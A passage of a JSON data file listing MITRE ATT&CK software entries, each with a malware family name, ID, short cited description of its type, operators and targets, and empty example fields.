      "DropBook"
    ],
    "id": "S0547"
  },
  "malware--3bc7e862-5610-4c02-9c48-15b2e2dc1ddb": {
    "name": "Woody RAT",
    "description": " [Woody RAT](https://attack.mitre.org/software/S1065) is a remote access trojan (RAT) that has been used since at least August 2021 against Russian organizations.(Citation: MalwareBytes WoodyRAT Aug 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Woody RAT"
    ],
    "id": "S1065"
  },
  "malware--3be1fb7a-0f7e-415e-8e3a-74a80d596e68": {
    "name": "Mafalda",
    "description": "[Mafalda](https://attack.mitre.org/software/S1060) is a flexible interactive implant that has been used by [Metador](https://attack.mitre.org/groups/G1013). Security researchers assess the [Mafalda](https://attack.mitre.org/software/S1060) name may be inspired by an Argentinian cartoon character that has been popular as a means of political commentary since the 1960s. (Citation: SentinelLabs Metador Sept 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Mafalda"
    ],
    "id": "S1060"
  },
  "malware--3c18ad16-9eaf-4649-984e-68551bff0d47": {
    "name": "Squirrelwaffle",
    "description": "[Squirrelwaffle](https://attack.mitre.org/software/S1030) is a loader that was first seen in September 2021. It has been used in spam email campaigns to deliver additional malware such as [Cobalt Strike](https://attack.mitre.org/software/S0154) and the [QakBot](https://attack.mitre.org/software/S0650) banking trojan.(Citation: ZScaler Squirrelwaffle Sep 2021)(Citation: Netskope Squirrelwaffle Oct 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Squirrelwaffle"
    ],
    "id": "S1030"
  },
  "malware--3d57dcc4-be99-4613-9482-d5218f5ec13e": {
    "name": "PolyglotDuke",
    "description": "[PolyglotDuke](https://attack.mitre.org/software/S0518) is a downloader that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2013. [PolyglotDuke](https://attack.mitre.org/software/S0518) has been used to drop [MiniDuke](https://attack.mitre.org/software/S0051).(Citation: ESET Dukes October 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "PolyglotDuke"
    ],
    "id": "S0518"
  },
  "malware--3e4e2c79-2b27-4245-a5c1-5586a3cbd8f5": {
    "name": "AuTo Stealer",
    "description": "[AuTo Stealer](https://attack.mitre.org/software/S1029) is malware written in C++ has been used by [SideCopy](https://attack.mitre.org/groups/G1008) since at least December 2021 to target government agencies and personnel in India and Afghanistan.(Citation: MalwareBytes SideCopy Dec 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "AuTo Stealer"
    ],
    "id": "S1029"
  },
  "malware--40a1b8ec-7295-416c-a6b1-68181d86f120": {
    "name": "Hildegard",
    "description": "[Hildegard](https://attack.mitre.org/software/S0601) is malware that targets misconfigured kubelets for initial access and runs cryptocurrency miner operations. The malware was first observed in January 2021. The TeamTNT activity group is believed to be behind [Hildegard](https://attack.mitre.org/software/S0601). (Citation: Unit 42 Hildegard Malware)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Hildegard"
    ],
    "id": "S0601"
  },
  "malware--425771c5-48b4-4ecd-9f95-74ed3fc9da59": {
    "name": "SombRAT",
    "description": "[SombRAT](https://attack.mitre.org/software/S0615) is a modular backdoor written in C++ that has been used since at least 2019 to download and execute malicious payloads, including [FIVEHANDS](https://attack.mitre.org/software/S0618) ransomware.(Citation: BlackBerry CostaRicto November 2020)(Citation: FireEye FiveHands April 2021)(Citation: CISA AR21-126A FIVEHANDS May 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SombRAT"
    ],
    "id": "S0615"
  },
  "malware--43155329-3edf-47a6-9a14-7dac899b01e4": {
    "name": "FlawedGrace",
    "description": "[FlawedGrace](https://attack.mitre.org/software/S0383) is a fully featured remote access tool (RAT) written in C++ that was first observed in late 2017.(Citation: Proofpoint TA505 Jan 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "FlawedGrace"
    ],
    "id": "S0383"
  },
  "malware--432555de-63bf-4f2a-a3fa-f720a4561078": {
    "name": "FlawedAmmyy",
    "description": "[FlawedAmmyy](https://attack.mitre.org/software/S0381) is a remote access tool (RAT) that was first seen in early 2016. The code for [FlawedAmmyy](https://attack.mitre.org/software/S0381) was based on leaked source code for a version of Ammyy Admin, a remote access software.(Citation: Proofpoint TA505 Mar 2018)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "FlawedAmmyy"
    ],
    "id": "S0381"
  },
  "malware--4327aff5-f194-440c-b499-4d9730cc1eab": {
    "name": "Snip3",
    "description": "[Snip3](https://attack.mitre.org/software/S1086) is a sophisticated crypter-as-a-service that has been used since at least 2021 to obfuscate and load numerous strains of malware including [AsyncRAT](https://attack.mitre.org/software/S1087), [Revenge RAT](https://attack.mitre.org/software/S0379), [Agent Tesla](https://attack.mitre.org/software/S0331), and [NETWIRE](https://attack.mitre.org/software/S0198).(Citation: Morphisec Snip3 May 2021)(Citation: Telefonica Snip3 December 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Snip3"
    ],
    "id": "S1086"
  },
  "malware--434ba392-ebdc-488b-b1ef-518deea65774": {
    "name": "FYAnti",
    "description": "[FYAnti](https://attack.mitre.org/software/S0628) is a loader that has been used by [menuPass](https://attack.mitre.org/groups/G0045) since at least 2020, including to deploy [QuasarRAT](https://attack.mitre.org/software/S0262).(Citation: Securelist APT10 March 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "FYAnti"
    ],
    "id": "S0628"
  },
  "malware--44c75271-0e4d-496f-ae0a-a6d883a42a65": {
    "name": "Rifdoor",
    "description": "[Rifdoor](https://attack.mitre.org/software/S0433) is a remote access trojan (RAT) that shares numerous code similarities with [HotCroissant](https://attack.mitre.org/software/S0431).(Citation: Carbon Black HotCroissant April 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Rifdoor"
    ],
    "id": "S0433"
  },
  "malware--44e2a842-415b-47f4-8549-83fbdb8a5674": {
    "name": "SUGARUSH",
    "description": "[SUGARUSH](https://attack.mitre.org/software/S1049) is a small custom backdoor that can establish a reverse shell over TCP to a hard coded C2 address. [SUGARUSH](https://attack.mitre.org/software/S1049) was first identified during analysis of UNC3890's [C0010](https://attack.mitre.org/campaigns/C0010) campaign targeting Israeli companies, which began in late 2020.(Citation: Mandiant UNC3890 Aug 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SUGARUSH"
    ],
    "id": "S1049"
  },
  "malware--452da2d9-706c-4185-ad6f-f5edaf4b9f48": {
    "name": "LoFiSe",
    "description": "[LoFiSe](https://attack.mitre.org/software/S1101) has been used by [ToddyCat](https://attack.mitre.org/groups/G1022) since at least 2023 to identify and collect files of interest on targeted systems.(Citation: Kaspersky ToddyCat Check Logs October 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "LoFiSe"
    ],
    "id": "S1101"
  },
  "malware--45c759ac-b490-48bb-80d4-c8eee3431027": {
    "name": "GuLoader",
    "description": "[GuLoader](https://attack.mitre.org/software/S0561) is a file downloader that has been used since at least December 2019 to distribute a variety of remote administration tool (RAT) malware, including [NETWIRE](https://attack.mitre.org/software/S0198), [Agent Tesla](https://attack.mitre.org/software/S0331), [NanoCore](https://attack.mitre.org/software/S0336), FormBook, and Parallax RAT.(Citation: Unit 42 NETWIRE April 2020)(Citation: Medium Eli Salem GuLoader April 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "GuLoader"
    ],
    "id": "S0561"
  },
  "malware--46cbafbc-8907-42d3-9002-5327c26f8927": {
    "name": "WastedLocker",
    "description": "[WastedLocker](https://attack.mitre.org/software/S0612) is a ransomware family attributed to [Indrik Spider](https://attack.mitre.org/groups/G0119) that has been used since at least May 2020. [WastedLocker](https://attack.mitre.org/software/S0612) has been used against a broad variety of sectors, including manufacturing, information technology, and media.(Citation: Symantec WastedLocker June 2020)(Citation: NCC Group WastedLocker June 2020)(Citation: Sentinel Labs WastedLocker July 2020) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "WastedLocker"
    ],
    "id": "S0612"
  },
  "malware--47124daf-44be-4530-9c63-038bc64318dd": {
    "name": "RegDuke",
    "description": "[RegDuke](https://attack.mitre.org/software/S0511) is a first stage implant written in .NET and used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2017. [RegDuke](https://attack.mitre.org/software/S0511) has been used to control a compromised machine when control of other implants on the machine was lost.(Citation: ESET Dukes October 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "RegDuke"
    ],
    "id": "S0511"
  },
  "malware--471d0e9f-2c8a-4e4b-8f3b-f85d2407806e": {
    "name": "ProLock",
    "description": "[ProLock](https://attack.mitre.org/software/S0654) is a ransomware strain that has been used in Big Game Hunting (BGH) operations since at least 2020, often obtaining initial access with [QakBot](https://attack.mitre.org/software/S0650). [ProLock](https://attack.mitre.org/software/S0654) is the successor to PwndLocker ransomware which was found to contain a bug allowing decryption without ransom payment in 2019.(Citation: Group IB Ransomware September 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ProLock"
    ],
    "id": "S0654"
  },
  "malware--4800d0f9-00aa-47cd-a4d2-92198585b8fd": {
    "name": "P.A.S. Webshell",
    "description": "[P.A.S. Webshell](https://attack.mitre.org/software/S0598) is a publicly available multifunctional PHP webshell in use since at least 2016 that provides remote access and execution on target web servers.(Citation: ANSSI Sandworm January 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "P.A.S. Webshell"
    ],
    "id": "S0598"
  },
  "malware--4816d361-f82b-4a18-aa05-b215e7cf9200": {
    "name": "QUIETEXIT",
    "description": "[QUIETEXIT](https://attack.mitre.org/software/S1084) is a novel backdoor, based on the open-source Dropbear SSH client-server software, that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021. [APT29](https://attack.mitre.org/groups/G0016) has deployed [QUIETEXIT](https://attack.mitre.org/software/S1084) on opaque network appliances that typically don't support antivirus or endpoint detection and response tools within a victim environment.(Citation: Mandiant APT29 Eye Spy Email Nov 22)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "QUIETEXIT"
    ],
    "id": "S1084"
  },
  "malware--49fee0b0-390e-4bde-97f8-97ed46bd19b7": {
    "name": "WhisperGate",
    "description": "[WhisperGate](https://attack.mitre.org/software/S0689) is a multi-stage wiper designed to look like ransomware that has been used against multiple government, non-profit, and information technology organizations in Ukraine since at least January 2022.(Citation: Cybereason WhisperGate February 2022)(Citation: Unit 42 WhisperGate January 2022)(Citation: Microsoft WhisperGate January 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "WhisperGate"
    ],
    "id": "S0689"
  },
  "malware--4b346d12-7f91-48d2-8f06-b26ffa0d825b": {
    "name": "RDAT",
    "description": "[RDAT](https://attack.mitre.org/software/S0495) is a backdoor used by the suspected Iranian threat group [OilRig](https://attack.mitre.org/groups/G0049). [RDAT](https://attack.mitre.org/software/S0495) was originally identified in 2017 and targeted companies in the telecommunications sector.(Citation: Unit42 RDAT July 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "RDAT"
    ],
    "id": "S0495"
  },
  "malware--4b68b5ea-2e1b-4225-845b-8632f702b9a0": {
    "name": "Skidmap",
    "description": "[Skidmap](https://attack.mitre.org/software/S0468) is a kernel-mode rootkit used for cryptocurrency mining.(Citation: Trend Micro Skidmap)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Skidmap"
    ],
    "id": "S0468"
  },
  "malware--4b6ec280-7bbb-48ff-ae59-b189520ebe83": {
    "name": "Okrum",
    "description": "[Okrum](https://attack.mitre.org/software/S0439) is a Windows backdoor that has been seen in use since December 2016 with strong links to [Ke3chang](https://attack.mitre.org/groups/G0004).(Citation: ESET Okrum July 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Okrum"
    ],
    "id": "S0439"
  },
  "malware--4c6d62c2-89f5-4159-8fab-0190b1f9d328": {
    "name": "Bonadan",
    "description": "[Bonadan](https://attack.mitre.org/software/S0486) is a malicious version of OpenSSH which acts as a custom backdoor. [Bonadan](https://attack.mitre.org/software/S0486) has been active since at least 2018 and combines a new cryptocurrency-mining module with the same credential-stealing module used by the Onderon family of backdoors.(Citation: ESET ForSSHe December 2018)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Bonadan"
    ],
    "id": "S0486"
  },
  "malware--4d7bf2ac-f953-4907-b114-be44dc174d67": {
    "name": "Neoichor",
    "description": "[Neoichor](https://attack.mitre.org/software/S0691) is C2 malware used by [Ke3chang](https://attack.mitre.org/groups/G0004) since at least 2019; similar malware families used by the group include Leeson and Numbldea.(Citation: Microsoft NICKEL December 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Neoichor"
    ],
    "id": "S0691"
  },
  "malware--4dea7d8e-af94-4bfb-afe4-7ff54f59308b": {
    "name": "Conti",
    "description": "[Conti](https://attack.mitre.org/software/S0575) is a Ransomware-as-a-Service (RaaS) that was first observed in December 2019. [Conti](https://attack.mitre.org/software/S0575) has been deployed via [TrickBot](https://attack.mitre.org/software/S0266) and used against major corporations and government agencies, particularly those in North America. As with other ransomware families, actors using [Conti](https://attack.mitre.org/software/S0575) steal sensitive files and information from compromised networks, and threaten to publish this data unless the ransom is paid.(Citation: Cybereason Conti Jan 2021)(Citation: CarbonBlack Conti July 2020)(Citation: Cybleinc Conti January 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Conti"
    ],
    "id": "S0575"
  },
  "malware--4e6464d2-69df-4e56-8d4c-1973f84d7b80": {
    "name": "Mispadu",
    "description": "[Mispadu](https://attack.mitre.org/software/S1122) is a banking trojan written in Delphi that was first observed in 2019 and uses a Malware-as-a-Service (MaaS) business model.(Citation: ESET Security Mispadu Facebook Ads 2019)(Citation: SCILabs Malteiro 2021) This malware is operated, managed, and sold by the [Malteiro](https://attack.mitre.org/groups/G1026) cybercriminal group.(Citation: SCILabs Malteiro 2021) [Mispadu](https://attack.mitre.org/software/S1122) has mainly been used to target victims in Brazil and Mexico, and has also had confirmed operations throughout Latin America and Europe.(Citation: SCILabs Malteiro 2021)(Citation: SCILabs URSA/Mispadu Evolution 2023)(Citation: Segurança Informática URSA Sophisticated Loader 2020) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Mispadu"
    ],
    "id": "S1122"
  },
  "malware--4e9bdf9a-4957-47f6-87b3-c76898d3f623": {
    "name": "Diavol",
    "description": "[Diavol](https://attack.mitre.org/software/S0659) is a ransomware variant first observed in June 2021 that is capable of prioritizing file types to encrypt based on a pre-configured list of extensions defined by the attacker.  The [Diavol](https://attack.mitre.org/software/S0659) Ransomware-as-a Service (RaaS) program is managed by [Wizard Spider](https://attack.mitre.org/groups/G0102) and it has been observed being deployed by [Bazar](https://attack.mitre.org/software/S0534).(Citation: Fortinet Diavol July 2021)(Citation: FBI Flash Diavol January 2022)(Citation: DFIR Diavol Ransomware December 2021)(Citation: Microsoft Ransomware as a Service)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Diavol"
    ],
    "id": "S0659"
  },
  "malware--4efc3e00-72f2-466a-ab7c-8a7dc6603b19": {
    "name": "Raindrop",
    "description": "[Raindrop](https://attack.mitre.org/software/S0565) is a loader used by [APT29](https://attack.mitre.org/groups/G0016) that was discovered on some victim machines during investigations related to the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024). It was discovered in January 2021 and was likely used since at least May 2020.(Citation: Symantec RAINDROP January 2021)(Citation: Microsoft Deep Dive Solorigate January 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Raindrop"
    ],
    "id": "S0565"
  },
  "malware--4f1c389e-a80e-4a3e-9b0e-9be8c91df64f": {
    "name": "Doki",
    "description": "[Doki](https://attack.mitre.org/software/S0600) is a backdoor that uses a unique Dogecoin-based Domain Generation Algorithm and was first observed in July 2020. [Doki](https://attack.mitre.org/software/S0600) was used in conjunction with the [ngrok](https://attack.mitre.org/software/S0508) Mining Botnet in a campaign that targeted Docker servers in cloud platforms. (Citation: Intezer Doki July 20)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Doki"
    ],
    "id": "S0600"
  },
  "malware--4fbd565b-bf55-4ac7-80b4-b183a7b64b9c": {
    "name": "Siloscape",
    "description": "[Siloscape](https://attack.mitre.org/software/S0623) is malware that targets Kubernetes clusters through Windows containers. [Siloscape](https://attack.mitre.org/software/S0623) was first observed in March 2021.(Citation: Unit 42 Siloscape Jun 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Siloscape"
    ],
    "id": "S0623"
  },
  "malware--50c44c34-3abb-48ae-9433-a2337de5b0bc": {
    "name": "BlackCat",
    "description": "[BlackCat](https://attack.mitre.org/software/S1068) is ransomware written in Rust that has been offered via the Ransomware-as-a-Service (RaaS) model. First observed November 2021, [BlackCat](https://attack.mitre.org/software/S1068) has been used to target multiple sectors and organizations in various countries and regions in Africa, the Americas, Asia, Australia, and Europe.(Citation: Microsoft BlackCat Jun 2022)(Citation: Sophos BlackCat Jul 2022)(Citation: ACSC BlackCat Apr 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BlackCat"
    ],
    "id": "S1068"
  },
  "malware--50d6688b-0985-4f3d-8cbe-0c796b30703b": {
    "name": "Fysbis",
    "description": "[Fysbis](https://attack.mitre.org/software/S0410) is a Linux-based backdoor used by [APT28](https://attack.mitre.org/groups/G0007) that dates back to at least 2014.(Citation: Fysbis Palo Alto Analysis)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Fysbis"
    ],
    "id": "S0410"
  },
  "malware--5147ef15-1cae-4707-8ea1-bee8d98b7f1d": {
    "name": "IcedID",
    "description": "[IcedID](https://attack.mitre.org/software/S0483) is a modular banking malware designed to steal financial information that has been observed in the wild since at least 2017.  [IcedID](https://attack.mitre.org/software/S0483)  has been downloaded by [Emotet](https://attack.mitre.org/software/S0367) in multiple campaigns.(Citation: IBM IcedID November 2017)(Citation: Juniper IcedID June 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "IcedID"
    ],
    "id": "S0483"
  },
  "malware--532c6004-b1e8-415b-9516-f7c14ba783b1": {
    "name": "MarkiRAT",
    "description": "[MarkiRAT](https://attack.mitre.org/software/S0652) is a remote access Trojan (RAT) compiled with Visual Studio that has been used by [Ferocious Kitten](https://attack.mitre.org/groups/G0137) since at least 2015.(Citation: Kaspersky Ferocious Kitten Jun 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "MarkiRAT"
    ],
    "id": "S0652"
  },
  "malware--53486bc7-7748-4716-8190-e4f1fde04c53": {
    "name": "PowerShower",
    "description": "[PowerShower](https://attack.mitre.org/software/S0441) is a PowerShell backdoor used by [Inception](https://attack.mitre.org/groups/G0100) for initial reconnaissance and to download and execute second stage payloads.(Citation: Unit 42 Inception November 2018)(Citation: Kaspersky Cloud Atlas August 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "PowerShower"
    ],
    "id": "S0441"
  },
  "malware--54089fba-8662-4f37-9a44-6ad25a5f630a": {
    "name": "HUI Loader",
    "description": "[HUI Loader](https://attack.mitre.org/software/S1097) is a custom DLL loader that has been used since at least 2015 by China-based threat groups including [Cinnamon Tempest](https://attack.mitre.org/groups/G1021) and [menuPass](https://attack.mitre.org/groups/G0045) to deploy malware on compromised hosts. [HUI Loader](https://attack.mitre.org/software/S1097) has been observed in campaigns loading [SodaMaster](https://attack.mitre.org/software/S0627), [PlugX](https://attack.mitre.org/software/S0013), [Cobalt Strike](https://attack.mitre.org/software/S0154), [Komplex](https://attack.mitre.org/software/S0162), and several strains of ransomware.(Citation: SecureWorks BRONZE STARLIGHT Ransomware Operations June 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "HUI Loader"
    ],
    "id": "S1097"
  },
  "malware--54895630-efd2-4608-9c24-319de972a9eb": {
    "name": "Ragnar Locker",
    "description": "[Ragnar Locker](https://attack.mitre.org/software/S0481) is a ransomware that has been in use since at least December 2019.(Citation: Sophos Ragnar May 2020)(Citation: Cynet Ragnar Apr 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Ragnar Locker"
    ],
    "id": "S0481"
  },
  "malware--54a01db0-9fab-4d5f-8209-53cef8425f4a": {
    "name": "FatDuke",
    "description": "[FatDuke](https://attack.mitre.org/software/S0512) is a backdoor used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2016.(Citation: ESET Dukes October 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "FatDuke"
    ],
    "id": "S0512"
  },
  "malware--54a73038-1937-4d71-a253-316e76d5413c": {
    "name": "Lucifer",
    "description": "[Lucifer](https://attack.mitre.org/software/S0532) is a crypto miner and DDoS hybrid malware that leverages well-known exploits to spread laterally on Windows platforms.(Citation: Unit 42 Lucifer June 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Lucifer"
    ],
    "id": "S0532"
  },
  "malware--554e010d-726b-439d-9a1a-f60fff0cc109": {
    "name": "GLASSTOKEN",
    "description": "[GLASSTOKEN](https://attack.mitre.org/software/S1117) is a custom web shell used by threat actors during [Cutting Edge](https://attack.mitre.org/campaigns/C0029) to execute commands on compromised Ivanti Secure Connect VPNs.(Citation: Volexity Ivanti Zero-Day Exploitation January 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "GLASSTOKEN"
    ],
    "id": "S1117"
  },
  "malware--5633ffd3-81ef-4f98-8f93-4896b03998f0": {
    "name": "DCSrv",
    "description": "[DCSrv](https://attack.mitre.org/software/S1033) is destructive malware that has been used by [Moses Staff](https://attack.mitre.org/groups/G1009) since at least  September 2021. Though [DCSrv](https://attack.mitre.org/software/S1033) has ransomware-like capabilities, [Moses Staff](https://attack.mitre.org/groups/G1009) does not demand ransom or offer a decryption key.(Citation: Checkpoint MosesStaff Nov 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "DCSrv"
    ],
    "id": "S1033"
  },
  "malware--56aa3c82-ed40-4b5a-84bf-7231356d9e96": {
    "name": "DRATzarus",
    "description": "[DRATzarus](https://attack.mitre.org/software/S0694) is a remote access tool (RAT) that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032) to target the defense and aerospace organizations globally since at least summer 2020. [DRATzarus](https://attack.mitre.org/software/S0694) shares similarities with [Bankshot](https://attack.mitre.org/software/S0239), which was used by [Lazarus Group](https://attack.mitre.org/groups/G0032) in 2017 to target the Turkish financial sector.(Citation: ClearSky Lazarus Aug 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "DRATzarus"
    ],
    "id": "S0694"
  },
  "malware--56d10a7f-bb42-4267-9b4c-63abb9c06010": {
    "name": "BOOSTWRITE",
    "description": "[BOOSTWRITE](https://attack.mitre.org/software/S0415) is a loader crafted to be launched via abuse of the DLL search order of applications used by [FIN7](https://attack.mitre.org/groups/G0046).(Citation: FireEye FIN7 Oct 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BOOSTWRITE"
    ],
    "id": "S0415"
  },
  "malware--56e6b6c2-e573-4969-8bab-783205cebbbf": {
    "name": "Rising Sun",
    "description": "[Rising Sun](https://attack.mitre.org/software/S0448) is a modular backdoor that was used extensively in [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013) between 2017 and 2019. [Rising Sun](https://attack.mitre.org/software/S0448) infected at least 87 organizations around the world, including nuclear, defense, energy, and financial service companies. Security researchers assessed [Rising Sun](https://attack.mitre.org/software/S0448) included some source code from [Lazarus Group](https://attack.mitre.org/groups/G0032)'s Trojan Duuzer.(Citation: McAfee Sharpshooter December 2018)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Rising Sun"
    ],
    "id": "S0448"
  },
  "malware--5763217a-05b6-4edd-9bca-057e47b5e403": {
    "name": "ShimRat",
    "description": "[ShimRat](https://attack.mitre.org/software/S0444) has been used by the suspected China-based adversary [Mofang](https://attack.mitre.org/groups/G0103) in campaigns targeting multiple countries and sectors including government, military, critical infrastructure, automobile, and weapons development. The name \"[ShimRat](https://attack.mitre.org/software/S0444)\" comes from the malware's extensive use of Windows Application Shimming to maintain persistence. (Citation: FOX-IT May 2016 Mofang)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ShimRat"
    ],
    "id": "S0444"
  },
  "malware--579607c2-d046-40df-99ab-beb479c37a2a": {
    "name": "Chrommme",
    "description": "[Chrommme](https://attack.mitre.org/software/S0667) is a backdoor tool written using the Microsoft Foundation Class (MFC) framework that was first reported in June 2021; security researchers noted infrastructure overlaps with [Gelsemium](https://attack.mitre.org/software/S0666) malware.(Citation: ESET Gelsemium June 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Chrommme"
    ],
    "id": "S0667"
  },
  "malware--57d83eac-a2ea-42b0-a7b2-c80c55157790": {
    "name": "BADFLICK",
    "description": "[BADFLICK](https://attack.mitre.org/software/S0642) is a backdoor used by [Leviathan](https://attack.mitre.org/groups/G0065) in spearphishing campaigns first reported in 2018 that targeted the U.S. engineering and maritime industries.(Citation: FireEye Periscope March 2018)(Citation: Accenture MUDCARP March 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BADFLICK"
    ],
    "id": "S0642"
  },
  "malware--5864e59f-eb4c-43ad-83b2-b5e4fae056c9": {
    "name": "ObliqueRAT",
    "description": "[ObliqueRAT](https://attack.mitre.org/software/S0644) is a remote access trojan, similar to [Crimson](https://attack.mitre.org/software/S0115), that has been in use by [Transparent Tribe](https://attack.mitre.org/groups/G0134) since at least 2020.(Citation: Talos Oblique RAT March 2021)(Citation: Talos Transparent Tribe May 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ObliqueRAT"
    ],
    "id": "S0644"
  },
  "malware--58c5a3a1-928f-4094-9e98-a5a4e56dd5f3": {
    "name": "Avaddon",
    "description": "[Avaddon](https://attack.mitre.org/software/S0640) is ransomware written in C++ that has been offered as Ransomware-as-a-Service (RaaS) since at least June 2020.(Citation: Awake Security Avaddon)(Citation: Arxiv Avaddon Feb 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Avaddon"
    ],
    "id": "S0640"
  },
  "malware--58eddbaf-7416-419a-ad7b-e65b9d4c3b55": {
    "name": "Conficker",
    "description": "[Conficker](https://attack.mitre.org/software/S0608) is a computer worm first detected in October 2008 that targeted Microsoft Windows using the MS08-067 Windows vulnerability to spread.(Citation: SANS Conficker) In 2016, a variant of [Conficker](https://attack.mitre.org/software/S0608) made its way on computers and removable disk drives belonging to a nuclear power plant.(Citation: Conficker Nuclear Power Plant)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Conficker"
    ],
    "id": "S0608"
  },
  "malware--5911d2ca-64f6-49b3-b94f-29b5d185085c": {
    "name": "SocGholish",
    "description": "[SocGholish](https://attack.mitre.org/software/S1124) is a JavaScript-based loader malware that has been used since at least 2017. It has been observed in use against multiple sectors globally for initial access, primarily through drive-by-downloads masquerading as software updates. SocGholish is operated by [Mustard Tempest](https://attack.mitre.org/groups/G1020) and its access has been sold to groups including [Indrik Spider](https://attack.mitre.org/groups/G0119) for downloading secondary RAT and ransomware payloads.(Citation: SentinelOne SocGholish Infrastructure November 2022)(Citation: SocGholish-update)(Citation: Red Canary SocGholish March 2024)(Citation: Secureworks Gold Prelude Profile) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SocGholish"
    ],
    "id": "S1124"
  },
  "malware--592260fb-dd5c-4a30-8d99-106a0485be0d": {
    "name": "Flagpro",
    "description": "[Flagpro](https://attack.mitre.org/software/S0696) is a Windows-based, first-stage downloader that has been used by [BlackTech](https://attack.mitre.org/groups/G0098) since at least October 2020. It has primarily been used against defense, media, and communications companies in Japan.(Citation: NTT Security Flagpro new December 2021) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Flagpro"
    ],
    "id": "S0696"
  },
  "malware--599cd7b5-37b5-4cdd-8174-2811531ce9d0": {
    "name": "SpicyOmelette",
    "description": "[SpicyOmelette](https://attack.mitre.org/software/S0646) is a JavaScript based remote access tool that has been used by [Cobalt Group](https://attack.mitre.org/groups/G0080) since at least 2018.(Citation: Secureworks GOLD KINGSWOOD September 2018)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SpicyOmelette"
    ],
    "id": "S0646"
  },
  "malware--59c8a28c-200c-4565-9af1-cbdb24870ba0": {
    "name": "Green Lambert",
    "description": "[Green Lambert](https://attack.mitre.org/software/S0690) is a modular backdoor that security researchers assess has been used by an advanced threat group referred to as Longhorn and The Lamberts. First reported in 2017, the Windows variant of [Green Lambert](https://attack.mitre.org/software/S0690) may have been used as early as 2008; a macOS version was uploaded to a multiscanner service in September 2014.(Citation: Kaspersky Lamberts Toolkit April 2017)(Citation: Objective See Green Lambert for OSX Oct 2021)  ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Green Lambert"
    ],
    "id": "S0690"
  },
  "malware--5c747acd-47f0-4c5a-b9e5-213541fc01e0": {
    "name": "GoldMax",
    "description": "[GoldMax](https://attack.mitre.org/software/S0588) is a second-stage C2 backdoor written in Go with Windows and Linux variants that are nearly identical in functionality. [GoldMax](https://attack.mitre.org/software/S0588) was discovered in early 2021 during the investigation into the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024), and has likely been used by [APT29](https://attack.mitre.org/groups/G0016) since at least mid-2019. [GoldMax](https://attack.mitre.org/software/S0588) uses multiple defense evasion techniques, including avoiding virtualization execution and masking malicious traffic.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: FireEye SUNSHUTTLE Mar 2021)(Citation: CrowdStrike StellarParticle January 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "GoldMax"
    ],
    "id": "S0588"
  },
  "malware--5d11d418-95dd-4377-b782-23160dfa17b4": {
    "name": "HELLOKITTY",
